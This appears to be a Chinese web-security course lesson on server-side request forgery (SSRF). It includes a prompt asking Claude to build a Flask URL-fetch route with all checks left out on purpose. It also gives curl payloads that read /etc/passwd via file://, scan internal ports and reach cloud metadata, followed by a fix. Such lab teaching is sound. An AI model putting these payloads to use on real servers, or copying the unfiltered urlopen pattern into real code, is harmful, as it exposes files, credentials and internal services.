# Day 8 - SSRF 服务端请求伪造

---

## 一、发给 Claude 的提示词

把以下内容完整复制粘贴到 claude.ai 对话框中：

```
请在上次已有的功能基础上，继续增加 URL 抓取功能。保持原有功能不变。

### 在 app.py 中新增以下内容：

1. 新增导入：import urllib.request, urllib.error

2. 新增路由 /fetch-url，支持 POST：
   - 从表单接收 url 参数
   - 需要登录才能访问（未登录时跳转到登录页）
   - 使用 urllib.request.urlopen() 直接访问用户提交的 URL
   - 不要对 url 参数做任何限制或过滤
   - 不要检查 URL 的协议（允许 http://、https://、file:// 等）
   - 不要检查目标 IP 是否为内网地址
   - 抓取成功后返回内容的前 5000 字符，包括状态码和内容
   - 设置超时时间为 10 秒

### 修改 templates/index.html

- 在首页已登录状态下添加 URL 抓取的入口
- 包含：URL 输入框、抓取按钮
- 抓取结果显示在下方：状态码、响应内容

### 代码规范要求
- 不要限制 URL 的协议（支持 file://）
- 不要阻止内网 IP（127.0.0.1、10.x.x.x）
- 不要设置任何代理或防火墙检查
- 直接将用户输入的 URL 传给 urlopen()

生成全部代码后告诉我，我复制覆盖到本地项目中。
```

---

## 二、学生操作步骤

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 复制上面提示词发给 Claude | 增加 URL 抓取功能 |
| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有功能不变 |
| 3 | 终端运行 `python app.py` | 启动项目 |
| 4 | 用 curl 测试 SSRF 漏洞 | 见下方 POC |
| 5 | 分析代码，编写修复到 fix/url_fetcher_fix.py | 修复漏洞 |
| 6 | `git add -A && git commit -m "day-08: URL抓取 + SSRF修复"` | 提交成果 |

---

## 三、漏洞原理

### 漏洞：SSRF（服务端请求伪造）

```python
@app.route('/fetch-url', methods=['POST'])
def fetch_url():
    target_url = request.form.get('url')
    # 直接使用用户输入的 URL，没有任何过滤！
    response = urllib.request.urlopen(target_url, timeout=10)
    content = response.read().decode('utf-8', errors='replace')[:5000]
    return render_template('index.html', content=content)
```

**三个缺失的防护**：

| 防护措施 | 本代码 | 说明 |
|---------|--------|------|
| 协议限制 | ❌ 无 | 支持 file://、gopher:// 等危险协议 |
| IP 限制 | ❌ 无 | 可访问 127.0.0.1 等内网地址 |
| DNS 校验 | ❌ 无 | 可绕过域名黑名单 |

### 攻击示意图

```
攻击者（远程）          服务器（公网）          内网服务
    │                      │                      │
    │── POST /fetch-url ──→│                      │
    │   url=http://        │                      │
    │   127.0.0.1:5000     │                      │
    │                      │── 访问内网 ────────→│
    │                      │   127.0.0.1:5000     │
    │                      │←── 返回内网数据 ────│
    │←── 攻击者看到内网 ──│                      │
    │    数据              │                      │

攻击者不能直接访问 127.0.0.1（那是攻击者自己的本机）
但服务器可以访问 127.0.0.1（是服务器的本机）
SSRF 利用服务器作为跳板，绕过防火墙访问内网
```

---

## 四、POC 代码

### POC 1：内网自访问

```bash
curl http://127.0.0.1:5000/fetch-url -b /tmp/cookies.txt -d "url=http://127.0.0.1:5000/"
```

**预期结果**：返回首页 HTML 内容，确认服务器可以访问自身。

### POC 2：读取本地文件

```bash
curl http://127.0.0.1:5000/fetch-url -b /tmp/cookies.txt -d "url=file:///etc/passwd"
```

**预期结果**：返回 /etc/passwd 文件内容，包含 root:x。

### POC 3：内网端口扫描

```bash
# 扫描内网端口
for port in 22 80 3306 6379 5000 8080; do
  echo "=== Port $port ==="
  curl http://127.0.0.1:5000/fetch-url -b /tmp/cookies.txt -d "url=http://127.0.0.1:$port" | grep -o "success.*true\|状态码.*200\|失败"
done
```

**预期结果**：开放的端口返回 200，关闭的端口返回超时或错误。

### POC 4：读取应用源码

```bash
curl http://127.0.0.1:5000/fetch-url -b /tmp/cookies.txt -d "url=file:///path/to/app.py"
```

---

## 五、Burp Suite 测试方法

1. 登录后提交 URL 抓取表单
2. 在 Burp 中拦截 POST /fetch-url 请求
3. 发送到 Repeater
4. 修改 url 参数测试：
   - `http://127.0.0.1:5000/` → 内网自访问
   - `file:///etc/passwd` → 读取系统文件
   - `http://127.0.0.1:22` → SSH 端口扫描
   - `http://169.254.169.254/latest/meta-data/` → 云服务元数据（如果在云环境）

---

## 六、POC 代码详细解释

### 为什么 SSRF 能访问内网？

```
攻击者 A 的电脑：
  127.0.0.1 → A 自己的电脑
  攻击者不能通过 127.0.0.1 访问到服务器的内网

服务器 S 的电脑：
  127.0.0.1 → S 自己的电脑
  服务器可以通过 127.0.0.1 访问自己的内网服务

SSRF 攻击流程：
  A 发送 url=http://127.0.0.1:5000 给 S
  S 执行 urllib.request.urlopen("http://127.0.0.1:5000")
  S 访问自己的 127.0.0.1:5000（Flask 应用自身）
  S 将结果返回给 A
  A 看到了 S 的本地服务信息
```

### file:// 协议原理

```
urllib.request.urlopen("file:///etc/passwd")
  → Python 的 urllib 支持 file:// 协议
  → 相当于 open("/etc/passwd", "r")
  → 文件内容被读取并返回

其他危险协议：
  file://   读取本地文件
  gopher:// 与内网服务交互（如 Redis）
  dict://   探测内网服务
  ftp://    访问内网 FTP
```

---

## 七、修复方案

创建 `fix/url_fetcher_fix.py`：

```python
import urllib.request
import socket
from urllib.parse import urlparse

# 修复 1：协议白名单
ALLOWED_PROTOCOLS = ('http://', 'https://')

# 修复 2：内网 IP 黑名单
PRIVATE_IPS = ('127.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
               '172.20.', '172.21.', '172.22.', '172.23.', '172.24.',
               '172.25.', '172.26.', '172.27.', '172.28.', '172.29.',
               '172.30.', '172.31.', '192.168.', '169.254.', '0.',
               'localhost', '::1')


def is_private_ip(hostname):
    """检查是否为内网 IP"""
    try:
        ip = socket.gethostbyname(hostname)
        return any(ip.startswith(prefix) for prefix in PRIVATE_IPS)
    except socket.gaierror:
        return True


def fetch_url_fixed(target_url):
    """修复：限制协议 + 禁止内网访问"""

    # 修复 1：协议白名单
    if not target_url.lower().startswith(ALLOWED_PROTOCOLS):
        return {"error": "不支持的协议"}

    # 修复 2：解析主机名并检查内网
    parsed = urlparse(target_url)
    if is_private_ip(parsed.hostname):
        return {"error": "禁止访问内网地址"}

    # 安全地发起请求
    try:
        response = urllib.request.urlopen(target_url, timeout=10)
        content = response.read().decode('utf-8', errors='replace')[:5000]
        return {"content": content, "status": response.status}
    except Exception as e:
        return {"error": str(e)}
```

---

## 八、漏洞复现检查清单

| # | 检查项 | curl 命令 | 预期结果 |
|---|--------|----------|---------|
| 1 | 自访问 | `url=http://127.0.0.1:5000` | 返回首页内容 |
| 2 | 读文件 | `url=file:///etc/passwd` | 返回 root:x |
| 3 | 端口扫描 | `url=http://127.0.0.1:22` | 超时 / 错误 |
| 4 | 正常请求 | `url=http://example.com` | 返回 200 |

---

## 九、课后任务

1. 测试内网自访问 http://127.0.0.1:5000
2. 用 file:// 协议读取 /etc/passwd
3. 编写端口扫描脚本扫描 127.0.0.1 的常见端口
4. 在 fix/ 目录下编写修复代码，添加协议白名单和内网 IP 黑名单
5. 验证修复后 file:// 和内网访问被阻止
6. （进阶）了解 gopher:// 协议如何攻击内网 Redis
7. 提交到自己的个人分支
